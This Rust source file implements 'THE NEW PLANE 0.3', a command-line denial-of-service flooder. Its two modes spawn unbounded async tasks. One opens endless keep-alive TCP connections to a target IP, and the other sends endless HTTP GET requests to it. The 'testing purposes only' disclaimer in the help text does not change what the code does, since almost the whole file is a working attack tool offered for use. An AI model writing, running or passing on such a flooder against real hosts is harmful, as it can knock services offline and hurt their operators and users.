
use colored::Colorize;
use std::io;

use tokio::net::TcpStream;
use tokio::io::AsyncWriteExt;

static mut CONTADOR: i32 = 0;

#[tokio::main]
async fn main() -> Result<(), io::Error> {
    let opc = std::env::args().nth(1).unwrap_or_default();
    let arg2 = std::env::args().nth(2).unwrap_or_default();

    let logo = "
████████╗██╗░░██╗███████╗  ███╗░░██╗███████╗░██╗░░░░░░░██╗
╚══██╔══╝██║░░██║██╔════╝  ████╗░██║██╔════╝░██║░░██╗░░██║
░░░██║░░░███████║█████╗░░  ██╔██╗██║█████╗░░░╚██╗████╗██╔╝
░░░██║░░░██╔══██║██╔══╝░░  ██║╚████║██╔══╝░░░░████╔═████║░
░░░██║░░░██║░░██║███████╗  ██║░╚███║███████╗░░╚██╔╝░╚██╔╝░
░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░╚══╝╚══════╝░░░╚═╝░░░╚═╝░░
        ██████╗░██╗░░░░░░█████╗░███╗░░██╗███████╗
        ██╔══██╗██║░░░░░██╔══██╗████╗░██║██╔════╝
        ██████╔╝██║░░░░░███████║██╔██╗██║█████╗░░
        ██╔═══╝░██║░░░░░██╔══██║██║╚████║██╔══╝░░
        ██║░░░░░███████╗██║░░██║██║░╚███║███████╗
    ";

    if opc == "-h" || opc == "--help" || opc == "/?" {
        println!("{}
THE NEW PLANE 0.3
Usage: ./thenewplane [options] IP

Options:
    -V, --version     Show the version of the program
    -h, --help        Display this help message
    -c, --connection  Open many connections to the target (Layer 4)
    -g, --get         Make many GET requests to the target (Layer 7)

This Software is a tool for testing purposes only and should not be 
used for illegal activities.
        ", logo.red());
        return Ok(());
    }

    if opc == "-V" || opc == "--version" {
        println!("THE NEW PLANE 0.3");
        return Ok(());
    }

    if opc == "-c" || opc == "--connection" {

        println!("Plane taking off");
 
        loop {
            let copia_arg2 = arg2.trim().to_owned();
            tokio::spawn ( 
                unsafe {
                    async move {
                        mantendo_conexao(copia_arg2).await.unwrap();
                    }
                }
            );
        }
    }

    if opc == "-g" || opc == "--get" {

        println!("Plane taking off");
 
        loop {
            let copia_arg2 = arg2.trim().to_owned();
            tokio::spawn ( 
                unsafe {
                    async move {
                        requisicoes_get(copia_arg2).await.unwrap();
                    }
                }
            );
        }
    }
    
    else {
        println!("Invalid option, please try again.");
    }

    Ok(())
}

async unsafe fn mantendo_conexao(ip:String) -> Result<(), io::Error>{
    let mut transmissao = TcpStream::connect(format!("{}",ip)).await?;

    let requisicao = format!(
        "GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: TheNewPlane/0.3\r\nConnection: keep-alive\r\n\r\n",ip);
    
    transmissao.write_all(requisicao.as_bytes()).await?;

    CONTADOR += 1; 
    println!("{}° Open connection", CONTADOR); 

    Ok(())
}

async unsafe fn requisicoes_get(url:String) -> Result<(), io::Error>{
    let req = reqwest::get(format!("http://{}",url)).await;
    drop(req);
    
    CONTADOR += 1; 
    println!("{}° Request", CONTADOR);

    Ok(())
}
